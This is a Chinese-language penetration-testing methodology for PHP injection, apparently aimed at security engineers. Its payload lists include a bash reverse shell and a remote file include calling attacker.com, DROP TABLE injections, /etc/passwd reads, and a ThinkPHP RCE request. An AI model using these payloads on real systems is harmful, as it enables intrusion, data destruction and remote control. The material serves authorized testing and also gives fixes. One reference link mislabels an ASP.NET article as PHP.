# PHP 注入测试方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 PHP 应用注入漏洞的系统化测试流程，覆盖 SQL 注入、命令注入、文件包含、代码注入、反序列化等 PHP 特有的注入类型。

## 1.2 适用范围
适用于使用 PHP 开发的 Web 应用、CMS 系统（WordPress、Drupal、Joomla 等）、框架应用（Laravel、Symfony、CodeIgniter 等）。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：PHP 应用注入系统化测试

### 2.1 技术介绍

PHP 应用注入测试针对 PHP 技术栈特有的漏洞类型，包括：
- **SQL 注入**：MySQLi、PDO 中的注入
- **命令注入**：system()、exec()、shell_exec() 等
- **文件包含**：include()、require() 中的 LFI/RFI
- **代码注入**：eval()、assert()、preg_replace 回调
- **反序列化漏洞**：unserialize()、PHP 对象注入
- **模板注入**：Smarty、Twig 注入

### 2.2 测试范围

| 测试对象 | 测试内容 |
|---------|---------|
| **框架** | Laravel、Symfony、CodeIgniter、ThinkPHP |
| **CMS** | WordPress、Drupal、Joomla、Discuz |
| **注入类型** | SQL、命令、文件包含、代码注入、反序列化 |
| **输入点** | 请求参数、HTTP 头、Cookie、文件上传 |

### 2.3 测试流程

#### 2.3.1 技术栈识别

**框架识别方法：**

```
# 响应头特征
X-Powered-By: PHP/7.4.3
Set-Cookie: laravel_session=
Set-Cookie: symfony=

# URL 路径特征
/wp-admin/  # WordPress
/administrator/  # Joomla
/user/login  # Drupal

# 文件特征
/robots.txt
/sitemap.xml
/composer.json

# 工具识别
whatweb http://target
wappalyzer (浏览器插件)
```

#### 2.3.2 SQL 注入测试（PHP）

**MySQLi 测试：**
```php
// 危险代码模式
$query = "SELECT * FROM users WHERE id = " . $id;
$result = mysqli_query($conn, $query);

// 测试 Payload
id=1'
id=1' OR '1'='1
id=1; DROP TABLE users--
```

**PDO 测试：**
```php
// 危险代码模式
$query = "SELECT * FROM users WHERE id = $id";
$stmt = $pdo->query($query);

// 安全代码
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $id]);
```

#### 2.3.3 命令注入测试（PHP）

**危险函数识别：**
```php
// 危险函数
system($cmd);
exec($cmd);
shell_exec($cmd);
passthru($cmd);
popen($cmd, 'r');
proc_open($cmd, ...);
```

**测试 Payload：**
```
# 基础命令
param=;id
param=|id
param=`id`
param=$(id)

# 时间延迟
param=;sleep 5
param=;ping -c 5 127.0.0.1

# 反向 Shell
param=;bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

#### 2.3.4 文件包含测试（PHP）

**危险函数识别：**
```php
// 危险函数
include($file);
require($file);
include_once($file);
require_once($file);
fopen($file, 'r');
file_get_contents($file);
```

**测试 Payload：**
```
# LFI 测试
file=../../../etc/passwd
file=....//....//etc/passwd

# RFI 测试（需要 allow_url_include=On）
file=http://attacker.com/shell.txt

# PHP 协议测试
file=php://filter/convert.base64-encode/resource=index.php
file=php://input
file=data://text/plain,<?php phpinfo(); ?>
file=zip://shell.jpg%23shell.php
file=phar://uploaded_image.jpg/shell.php
```

#### 2.3.5 代码注入测试（PHP）

**危险函数识别：**
```php
// 危险函数
eval($code);
assert($code);
preg_replace("/pattern/e", $replacement, $subject);  // /e 修饰符
create_function($args, $code);
array_map($callback, $array);  // callback 可控
call_user_func($callback, ...);
```

**测试 Payload：**
```
# eval 注入
code=phpinfo();
code=system('id');

# assert 注入
assert=create_function('', 'phpinfo()');

# preg_replace /e 注入
search=.{${phpinfo()}}
```

#### 2.3.6 反序列化测试（PHP）

**危险函数识别：**
```php
// 危险函数
unserialize($data);
```

**测试 Payload：**
```
# 基础测试
cookie=YToxOntzOjQ6Im5hbWUiO3M6NjoiYWRtaW4iO30=

# 使用 phpggc 生成 Payload
phpggc Laravel/RCE1 'phpinfo()'
phpggc WordPress/RCE1 'system("id")'
```

### 2.4 测试用例清单

#### 2.4.1 Laravel 测试

```
# Debug 模式泄露
GET /_debugbar/open

# 反序列化
Cookie: XSRF-TOKEN=PAYLOAD

# Blade 模板注入
GET /search?q={{system('id')}}

# SQL 注入（查询构建器）
GET /api/user?sort=id;DROP TABLE users--
```

#### 2.4.2 WordPress 测试

```
# SQL 注入（插件）
GET /wp-content/plugins/vulnerable-plugin/?id=1'

# 文件包含
GET /wp-content/plugins/vulnerable-plugin/include.php?file=../../../etc/passwd

# 反序列化
GET /wp-admin/admin-ajax.php?action=vulnerable&data=PAYLOAD
```

#### 2.4.3 ThinkPHP 测试

```
# RCE（历史漏洞）
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

# SQL 注入
GET /index.php/home/user/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1
```

#### 2.4.4 Discuz 测试

```
# SQL 注入
GET /forum.php?mod=viewthread&tid=1'

# 文件包含
GET /source/plugin/vulnerable/include.php?file=../../../etc/passwd
```

#### 2.4.5 HTTP 头测试

```
# User-Agent
User-Agent: ' OR '1'='1--
User-Agent: <?php system('id'); ?>

# Referer
Referer: ' UNION SELECT 1,version()--

# X-Forwarded-For
X-Forwarded-For: 127.0.0.1' OR '1'='1--

# Cookie
Cookie: PHPSESSID=admin'--
Cookie: user_data=unserialize_payload
```

### 2.5 自动化测试工具

#### 工具推荐

```bash
# SQLMap - SQL 注入
sqlmap -u "http://target/page.php?id=1" --dbms=mysql

# 文件包含测试
fimap -u "http://target/page.php?file=test"

# PHP 反序列化 Payload 生成
phpggc Laravel/RCE1 'phpinfo()'

# CMS 扫描
wpscan --url http://target/wordpress
joomscan --url http://target/joomla

# 综合扫描
gobuster dir -u http://target -w common.txt -x php
```

#### Burp Suite 插件

- **PHP Object Injection** - 检测反序列化
- **Hackvertor** - 编码/解码
- **Logger++** - 详细日志记录

### 2.6 测试报告要点

测试完成后，报告应包含：
1. PHP 版本和框架/CMS 信息
2. 所有测试的输入点列表
3. 发现的漏洞点及详情
4. 漏洞利用难度评估
5. 潜在影响范围
6. 修复建议

---

# 第三部分：附录

## 3.1 PHP 危险函数速查表

| 类别 | 危险函数 | 安全替代 |
|-----|---------|---------|
| **SQL 查询** | `mysqli_query($conn, $sql)` | `prepare()` + `bind_param()` |
| **SQL 查询** | `PDO::query($sql)` | `PDO::prepare()` |
| **命令执行** | `system()`, `exec()`, `shell_exec()` | 避免使用，使用专用库 |
| **文件包含** | `include()`, `require()` | 白名单验证 |
| **文件读取** | `file_get_contents()` | 路径白名单 |
| **代码执行** | `eval()`, `assert()` | 避免使用 |
| **正则** | `preg_replace(/e)` | `preg_replace_callback()` |
| **反序列化** | `unserialize()` | `json_decode()` |

## 3.2 PHP 协议速查表

| 协议 | 用途 | 示例 |
|-----|------|------|
| `php://filter` | 过滤读取 | `php://filter/convert.base64-encode/resource=index.php` |
| `php://input` | 读取 POST 数据 | `file=php://input` + POST `<?php system('id'); ?>` |
| `data://` | Data URI | `data://text/plain,<?php system('id'); ?>` |
| `zip://` | 包含 zip 文件 | `zip://shell.jpg%23shell.php` |
| `phar://` | 包含 phar 文件 | `phar://uploaded.jpg/shell.php` |
| `expect://` | 执行命令 | `expect://id` |

## 3.3 参考资源

- [OWASP PHP Security](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
- [PHP Security Manual](https://www.php.net/manual/en/security.php)
- [PortSwigger - PHP Deserialization](https://portswigger.net/research/exploiting-deserialisation-in-asp-net-via-viewstate)
- [PHPGGC Project](https://github.com/ambionics/phpggc)
